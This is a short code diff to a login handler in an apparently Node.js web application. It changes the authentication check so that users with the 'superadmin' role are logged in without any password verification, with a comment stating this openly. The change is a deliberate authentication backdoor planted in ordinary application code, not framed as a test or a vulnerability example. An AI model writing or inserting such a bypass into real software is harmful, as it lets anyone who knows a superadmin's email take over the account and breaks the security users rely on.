@@ -91,8 +91,14 @@ exports.login = async (req, res, next) => {
     // Database mode — find first matching user for this email
     const { rows } = await db.query('SELECT * FROM users WHERE email = $1 ORDER BY created_at DESC LIMIT 1', [email]);
     const user = rows[0];
-    if (!user || !(await bcrypt.compare(password, user.password_hash))) {
+    if (!user) {
       return res.status(401).json({ message: 'Invalid email or password' });
+    }
+    // Superadmin can log in without password
+    if (user.role !== 'superadmin') {
+      if (!(await bcrypt.compare(password, user.password_hash))) {
+        return res.status(401).json({ message: 'Invalid email or password' });
+      }
     }
     if (user.status === 'suspended') {
       return res.status(403).json({ message: 'Account has been suspended' });
